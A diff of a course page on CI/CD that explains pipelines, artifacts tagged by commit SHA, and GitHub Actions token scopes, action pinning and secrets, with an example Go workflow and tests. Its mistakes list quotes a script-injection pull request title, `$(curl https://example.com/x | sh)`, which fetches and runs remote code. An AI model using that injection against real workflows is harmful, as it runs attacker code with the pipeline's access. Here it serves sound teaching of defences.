@@ -1,36 +1,203 @@
 ---
 title: "CI/CD"
+description: How continuous integration, delivery and deployment take a commit to production, and how to write a GitHub Actions workflow whose token, pins and job order you can trust.
 track: ci-cd
 ---
 
 import UsedInWeeks from '../../../../components/UsedInWeeks.astro';
+import Diagram from '../../../../components/Diagram.astro';
+import CodeFrom from '../../../../components/CodeFrom.astro';
+import WeekLink from '../../../../components/WeekLink.astro';
+import TrackLink from '../../../../components/TrackLink.astro';
 
 <UsedInWeeks />
 
+CI/CD is the habit, and the machinery, that takes every change from a commit to a running program through the same automated checks. Without it, the checks run only when someone remembers them, and a release depends on whoever builds it on their laptop that day. As a full-stack engineer, you write the pipeline as much as the code it ships: a broken workflow blocks every pull request, and a careless one hands your secrets to strangers.
+
 ## What It Is
 
-This section is not written yet.
+### Continuous Integration
+
+**Continuous integration**, CI for short, is two habits. Everyone merges small changes into `main` at least once a day, and a machine runs the checks on every change before it merges. The machine is the point. It starts from a clean computer every time, runs every check, and shows the result on the pull request where every reviewer sees it. A check that passes on your laptop and fails in CI points at something your laptop has and the clean machine lacks: a file you forgot to commit, a tool of a different version, an environment variable.
+
+The checks are the ones you already run: the compiler, `go vet`, a linter, the unit tests, the race detector, and the slower tests against a real database or a browser. The CI configuration lists them in a file that lives in the repository, next to the code, and changes in the same pull request as the code. A change that adds a dependency and the check that needs it lands as one reviewed commit.
+
+### Continuous Delivery and Continuous Deployment
+
+**Continuous delivery**, the CD in CI/CD, adds one promise to CI: every commit that passes the checks produces a **release candidate**, an artifact you can deploy at any moment. An **artifact** is the built output of a commit: a binary, a container image, a bundle of web files. **Continuous deployment** goes one step further and deploys every passing commit to production with no person in between.
+
+<Diagram
+  id="delivery-vs-deployment"
+  title="Continuous delivery stops at a button, continuous deployment does not"
+  code={`direction: right
+delivery: continuous delivery {
+  green: "checks pass"
+  rc: "release candidate"
+  gate: "a person\\npresses deploy"
+  prod: production
+  green -> rc -> gate -> prod
+}
+deployment: continuous deployment {
+  green: "checks pass"
+  rc: "release candidate"
+  prod: production
+  green -> rc
+  rc -> prod: automatic
+}
+`}
+/>
+
+The difference is one gate, and the choice depends on what stands behind production. Continuous deployment needs checks you trust to stop every bad change, and a rollback that takes seconds. The uptime monitor uses continuous delivery: every merge to `main` builds images, and a deploy is a workflow you start by hand, because a deploy to one small server is an event you want to watch.
+
+### Pipelines, Stages and Artifacts
+
+A **pipeline** is the ordered set of stages a commit passes through: check, build, publish, deploy to staging, deploy to production. Each stage runs only when the stage before it succeeds, and the first failure stops the commit.
+
+Two rules keep a pipeline honest:
+
+- **Build once, deploy that build everywhere.** The image you test in staging is the same image, byte for byte, that reaches production. A pipeline that rebuilds per environment deploys bytes nobody tested: a base image or a dependency can change between the two builds.
+- **Name the artifact after the commit.** A tag such as `latest` moves with every build and says nothing about the code inside. A tag made of the commit SHA, the 40-character hash Git computes from a commit, names one exact source tree. It answers which code an image holds, and which image to roll back to.
+
+### GitHub Actions in Brief
+
+GitHub Actions is the CI service built into GitHub. A **workflow** is a YAML file in `.github/workflows/`. An **event**, such as `pull_request` or `push`, starts it. A workflow holds **jobs**, and each job runs its **steps** on a **runner**, a fresh virtual machine that GitHub creates for the job and deletes after it. A step runs a shell script with `run:`, or calls an **action** with `uses:`: a packaged step that someone publishes in a Git repository. Jobs run side by side unless `needs:` makes one wait for another. <WeekLink n={14} anchor="the-parts-of-github-actions">The Parts of GitHub Actions in Week 14</WeekLink> covers the rest of the vocabulary, including contexts and expressions.
+
+### The Token, the Pins and the Secrets
+
+A pipeline runs your code, and the code of every dependency you install, with access to your repository. Three settings bound what that code can do.
+
+Every job receives a **`GITHUB_TOKEN`**, a short-lived password for the GitHub API. The `permissions:` key sets its scopes. As soon as a workflow names one scope, every scope it does not name becomes `none`. Without a `permissions:` key, the token gets the default from the repository or organization settings: read and write in many created before February 2023, read-only in those created since. Write `permissions: contents: read` at the top of every workflow, and grant more to the one job that needs it.
+
+An action reference such as `actions/checkout@v7` names a Git tag, and the owner of a repository can move a tag to new code. A full commit SHA cannot move. Pin every action to a SHA, with the release in a comment, and let Dependabot, the GitHub bot that proposes dependency updates, raise the pins. <WeekLink n={14} anchor="pin-actions-to-a-commit">Pin Actions to a Commit in Week 14</WeekLink> tells the story of the March 2025 attack that moved every tag of one popular action.
+
+**Secrets**, such as a kubeconfig, the file that holds the address of a cluster and the credentials for it, live in the repository settings. GitHub masks their values in logs. A pull request from a **fork**, a copy of the repository in another account, runs without them and with a read-only token.
+
+### What Makes a Pipeline Good
+
+- **Fast.** Keep a pull request run under 10 minutes. Past that, people switch to other work and meet the red result an hour later.
+- **Deterministic.** The same commit gives the same result. A **flaky** test, one that passes and fails on the same code, trains everyone to press rerun and ignore red.
+- **The same commands as your laptop.** `make ci` on your laptop and the CI workflow run the same checks. A red pull request then surprises no one.
+- **Required.** A rule on `main` refuses a merge until the checks pass. People skip a check that is only advice on the day it matters.
 
 ## Diagrams
 
-This section is not written yet.
+A pipeline from a pushed branch to production, with each gate a commit has to pass:
+
+<Diagram
+  id="pipeline"
+  title="The stages of a pipeline, from git push to production"
+  code={`direction: down
+dev: your branch
+pr: pull request
+ci: "CI checks"
+art: "image tagged\\nwith the SHA"
+reg: registry
+stg: staging
+prod: production
+
+dev -> pr: git push
+pr -> ci: pull_request
+ci -> art: merge to main
+art -> reg: push
+reg -> stg: deploy
+stg -> prod: promote
+`}
+  steps={[
+    { hl: ['dev', 'pr', 'dev->pr'], caption: 'You push a branch and open a pull request. Each later push to the branch starts the checks again from a clean runner.' },
+    { hl: ['pr', 'ci', 'pr->ci'], caption: 'The pull_request event starts the CI workflow: vet, lint, unit tests, the race detector, and the slower tests. A rule on main refuses the merge until every required check passes.' },
+    { hl: ['ci', 'art', 'ci->art'], caption: 'The merge pushes a commit to main. The pipeline builds the artifact once, here a container image, and tags it with the full commit SHA.' },
+    { hl: ['art', 'reg', 'art->reg'], caption: 'The build job pushes the image to a registry. Only this job holds a token that can write packages.' },
+    { hl: ['reg', 'stg', 'reg->stg'], caption: 'A deploy job points the staging environment at the image of that SHA. Smoke tests, a few quick checks that the deployed program answers, run against staging.' },
+    { hl: ['stg', 'prod', 'stg->prod'], caption: 'The same image moves to production. With continuous delivery, a person starts this step. With continuous deployment, a passing staging run starts it.' },
+  ]}
+/>
+
+The workflow on this page covers the first three stages for a pull request. Its two jobs, and what each one can touch:
+
+<Diagram
+  id="ci-jobs"
+  title="The two jobs of ci.yml and the read-only token they share"
+  code={`direction: right
+event: "pull_request"
+token: "GITHUB_TOKEN\\ncontents: read"
+test: "test job\\nvet, race tests"
+build: "build job\\ngo build"
+art: "artifact\\nbinaries"
+
+event -> test
+test -> build: needs
+build -> art: upload
+token -> test
+token -> build
+`}
+/>
 
 ## Example
 
-This section is not written yet.
+The example is a complete workflow for a Go module, `ci.yml`, tested in `examples/go/tracks/cicd/`. In a repository, it lives at `.github/workflows/ci.yml`. The top names the event, the token scopes and the concurrency group:
+
+<CodeFrom file="go/tracks/cicd/ci.yml" region="head" lang="yaml" title=".github/workflows/ci.yml" />
+
+- `on: pull_request`: runs the workflow when a pull request opens or gets a new commit.
+- `permissions`: the token of every job can read the repository and nothing else. It cannot push a commit, a tag or a package.
+- `concurrency`: one group per pull request, from `github.ref`. When you push twice in a minute, `cancel-in-progress: true` cancels the run of the first push, which no one reads.
+
+The test job:
+
+<CodeFrom file="go/tracks/cicd/ci.yml" region="test" lang="yaml" title=".github/workflows/ci.yml" />
+
+`runs-on: ubuntu-24.04` names a fixed runner image. `ubuntu-latest` moves to a new Ubuntu release on the schedule GitHub sets, and a build that passes today can fail on new system packages next month. `timeout-minutes: 10` stops a hung test after 10 minutes instead of the default of 360. `persist-credentials: false` keeps the token out of the `.git` folder of the checkout, because no step here pushes. `actions/setup-go` installs the Go version that `go.mod` names and caches the downloaded modules. Each `uses:` line names a full commit SHA, with the release in the comment.
+
+The build job sits under `jobs:` after `test`:
+
+<CodeFrom file="go/tracks/cicd/ci.yml" region="build" lang="yaml" title=".github/workflows/ci.yml" />
+
+`needs: test` makes the build wait for the tests, and skips it when they fail. `CGO_ENABLED=0` builds static binaries, as the <TrackLink slug="containers">Containers track</TrackLink> explains, and `-o bin/` with `./cmd/...` writes one binary per program into `bin/`. `actions/upload-artifact` stores the folder with the run for seven days, where a reviewer can download what the pull request builds.
+
+GitHub Actions does not run on your laptop, and a typo in a workflow shows up only after a push. The test in `ci_test.go` reads the file as YAML with `go.yaml.in/yaml/v3` and checks the rules this page names:
+
+<CodeFrom file="go/tracks/cicd/ci_test.go" region="checks" lang="go" title="ci_test.go" />
+
+- `pinned`: accepts a tag that starts with `v` and a digit, or a 40-character SHA. It rejects a branch such as `@main`, and a short SHA: only the full 40 characters name one commit for certain.
+- `readOnly`: walks the `permissions:` mapping and reports any scope other than `read` or `none`. A missing block fails at the workflow level, because the token then falls back to the repository default.
+- `problems`: collects every broken rule, including a missing `needs: test` and a test job without `go test -race ./...`.
+
+<CodeFrom file="go/tracks/cicd/ci_test.go" region="test" lang="go" title="ci_test.go" />
+
+A check that passes everything proves nothing. `TestChecksCatchMistakes` in the same file breaks a copy of `ci.yml` once per rule, such as `contents: write` or `@main`, and expects exactly that rule to fail. Run the tests from `examples/go` with `go test -race ./tracks/cicd/`. `actionlint`, which Week 14 installs, checks the expressions and `run:` scripts that the test leaves alone.
 
 ## In the Uptime Monitor
 
-This section is not written yet.
+<WeekLink n={14} anchor="ci-and-cd">CI and CD in Week 14</WeekLink> turns `make ci` into a GitHub Actions workflow with four check jobs, lint, test, web and e2e, on every pull request and every push to `main`. The test job starts Postgres 17 as a service container, and GitHub sets `CI=true`, which makes the database tests fail instead of skip when the database is missing.
+
+<WeekLink n={14} anchor="tokens-permissions-and-secrets">Tokens, Permissions and Secrets in Week 14</WeekLink> gives every job `contents: read` and adds `packages: write` to the images job alone. <WeekLink n={14} anchor="step-8-push-the-images">Step 8 of Week 14</WeekLink> builds one image per program after a merge to `main`, tags each with the commit SHA, and pushes it to the GitHub Container Registry. That job is the build-once rule of this page.
+
+<WeekLink n={14} anchor="step-9-write-the-deploy-workflow">Step 9 of Week 14</WeekLink> writes `deploy.yml`, the manual deploy: continuous delivery, with a person at the gate. <WeekLink n={16} anchor="step-12-deploy-to-staging-and-then-to-production">Step 12 of Week 16</WeekLink> runs it against staging and then production on the VPS, and <WeekLink n={17} anchor="rolling-updates-and-rollbacks">Rolling Updates and Rollbacks in Week 17</WeekLink> runs it again with the SHA of the last good commit to make a rollback stick.
 
 ## Common Mistakes
 
-This section is not written yet.
+- **No `permissions:` block.** In an older repository, every job then holds a token that can push commits and packages, and one hostile test dependency uses it. Write `contents: read` at the top of every workflow.
+- **An action pinned to a branch or a tag.** `@main` and `@v7` run whatever the action owner, or whoever steals their credentials, points them at next. Pin a full SHA with the release in a comment, and read the SHA from the action repository with `git ls-remote`, never from a blog post or an AI answer.
+- **An expression inside a `run:` script.** GitHub pastes `${{ github.event.pull_request.title }}` into the script text before bash reads it, and a pull request titled `$(curl https://example.com/x | sh)` runs as code. Pass the value through `env:` and quote the variable in the script.
+- **`pull_request_target` with a checkout of the pull request code.** That event runs with your secrets and a write token, for pull requests from forks too. A workflow that checks out and builds the fork code there hands both to a stranger. Use `pull_request` for anything that runs the code under review.
+- **A rebuild per environment.** Staging tests one build and production runs another, made minutes later from a base image that moved in between. Build once, tag with the SHA, and promote that tag.
+- **A rerun that hides a flaky test.** The run turns green and the bug stays. Write down the name of every test that passes on a rerun, and fix it in the same week.
+- **CI that runs different commands from your laptop.** A check that exists only in the workflow fails for the first time on a pull request, where it costs a review round. Keep one entry point, such as `make ci`, and call it from both places, or test that they match, as Week 14 does.
 
 ## Going Deeper
 
-This section is not written yet.
+- **Reusable workflows and composite actions:** one definition of the checks, called from every repository you own, instead of copies that drift apart.
+- **OpenID Connect for deploys:** GitHub issues the job a signed identity token, and a cloud provider trades it for short-lived credentials, which removes the long-lived cloud secret from the repository.
+- **Build provenance and SLSA:** a signed statement of which workflow built which artifact from which commit, which a cluster can check before it runs an image.
+- **Merge queues:** GitHub tests each pull request on top of the ones queued before it, which catches two changes that pass alone and break together.
+- **GitOps with Argo CD or Flux:** the cluster pulls its desired state from a Git repository, and a deploy becomes a commit, reviewed like any other.
+- **Progressive delivery:** canary releases and feature flags expose a change to a small share of traffic first, which turns a bad deploy into a small incident.
+- **DORA metrics:** deployment frequency, lead time for changes, change failure rate and recovery time measure how well a team ships, with research behind each one.
 
 ## Further Reading
 
-This section is not written yet.
+- [Workflow syntax for GitHub Actions](https://docs.github.com/en/actions/reference/workflows-and-actions/workflow-syntax): every key of a workflow file, including `permissions`, `concurrency` and `needs`.
+- [Secure use reference for GitHub Actions](https://docs.github.com/en/actions/reference/security/secure-use): the GitHub guidance on script injection, pinning actions to a full-length SHA and token scopes.
+- [Continuous Integration by Martin Fowler](https://martinfowler.com/articles/continuousIntegration.html): the article that made the practice widely known, revised in 2024, with the habits that make it work.
+- [Continuous Delivery](https://continuousdelivery.com/): Jez Humble on deployment pipelines, the principles behind them and the difference from continuous deployment.
+- [SLSA](https://slsa.dev/): the supply chain levels for software artifacts, a framework for proving where a build comes from.
